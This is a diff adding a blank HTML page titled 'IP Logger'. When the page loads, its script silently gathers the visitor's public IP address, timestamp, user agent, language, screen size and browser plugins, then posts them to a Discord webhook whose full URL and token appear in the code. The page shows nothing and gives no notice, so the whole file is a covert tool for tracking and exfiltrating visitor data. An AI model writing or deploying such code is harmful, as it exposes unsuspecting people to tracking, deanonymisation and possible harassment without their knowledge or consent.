@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Logger</title>
+</head>
+<body>
+    <script>
+        // Function to get browser information
+        function getBrowserInfo() {
+            const userAgent = navigator.userAgent;
+            const language = navigator.language;
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+
+            return {
+                userAgent,
+                language,
+                screenWidth,
+                screenHeight
+            };
+        }
+
+        // Function to get all available plugins
+        function getPlugins() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+            return plugins.join(', ');
+        }
+
+        fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const time = new Date().toLocaleString();
+            let logEntry = `IP Address: ${ip} - Timestamp: ${time}\n`;
+
+            // Get browser information
+            const browserInfo = getBrowserInfo();
+            logEntry += `\n--- Browser Information ---\n`;
+            logEntry += `User Agent: ${browserInfo.userAgent}\n`;
+            logEntry += `Language: ${browserInfo.language}\n`;
+            logEntry += `Screen Width: ${browserInfo.screenWidth}\n`;
+            logEntry += `Screen Height: ${browserInfo.screenHeight}\n`;
+
+            // Get available plugins
+            const plugins = getPlugins();
+            logEntry += `\n--- Plugins ---\n`;
+            logEntry += plugins + '\n';
+
+            // Send the log to the Discord webhook
+            const webhookURL = 'https://discord.com/api/webhooks/1246766167067197590/GMUZLbsdFU8QnHRYqrFVCTfirLrIMJCOBJfFZ7OJOjGRSXi1GjAR0_0mFT3-5K8lKLcr';
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: logEntry
+                })
+            });
+        });
+    </script>
+</body>
+</html>
